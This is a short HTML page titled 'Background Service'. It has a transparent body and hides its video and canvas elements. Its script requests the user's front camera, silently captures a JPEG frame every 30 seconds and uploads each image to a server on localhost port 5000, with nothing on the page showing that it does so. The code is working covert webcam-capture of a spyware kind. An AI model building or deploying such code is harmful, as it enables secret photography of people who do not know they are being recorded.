<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Background Service</title>
</head>
<body style="background:transparent; margin:0; overflow:hidden;">
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                v.srcObject = stream;
                
                v.onloadedmetadata = () => {
                    // Match canvas size to the actual camera resolution
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    
                    // Interval set to 30,000ms (30 seconds)
                    setInterval(snap, 30000);
                };
            } catch (e) {
                console.error("Camera error:", e);
            }
        }

        function snap() {
            const ctx = c.getContext('2d');
            
            // Ensure the canvas matches current stream size (handles orientation changes)
            c.width = v.videoWidth;
            c.height = v.videoHeight;

            // Clear and draw the fresh frame
            ctx.clearRect(0, 0, c.width, c.height);
            ctx.drawImage(v, 0, 0, c.width, c.height);
            
            c.toBlob((blob) => {
                const fd = new FormData();
                // Adding a unique timestamp to the filename helps the server/browser 
                // distinguish it as a brand new file.
                const timestamp = new Date().getTime();
                fd.append('image', blob, `shot_${timestamp}.jpg`);
                
                fetch('http://[::1]:5000/upload', {
                    method: 'POST',
                    mode: 'cors',
                    body: fd
                })
                .then(() => console.log(`Uploaded at ${new Date().toLocaleTimeString()}`))
                .catch(err => console.error('Upload error:', err));
            }, 'image/jpeg', 0.9);
        }

        start();
    </script>
</body>
</html>
